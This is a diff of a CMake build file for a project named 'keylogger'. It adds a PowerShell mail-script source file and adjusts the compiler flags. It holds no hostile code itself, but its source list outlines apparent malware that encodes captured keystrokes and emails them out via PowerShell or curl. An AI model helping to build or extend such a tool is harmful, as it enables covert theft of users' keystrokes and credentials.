@@ -4,6 +4,7 @@ set(SOURCES
 		KeyloggerDirectoryLocator.cpp
 		Base64Encryptor.cpp
         TimestampFetcher.cpp
+        PowerShellSendMailScriptCreator.cpp
         PowerShellMailSender.cpp
         CurlMailSender.cpp
 		Timer.cpp
@@ -15,7 +16,7 @@ set(SOURCES
 
 add_executable(keylogger ${SOURCES} "Main.cpp")
 
-target_compile_options(keylogger PRIVATE -std=c++20 /permissive-)
+target_compile_options(keylogger PRIVATE /std:c++17 /permissive- /W3)
 target_include_directories(keylogger PRIVATE
         ${CURL_INCLUDE_DIR}
 		)
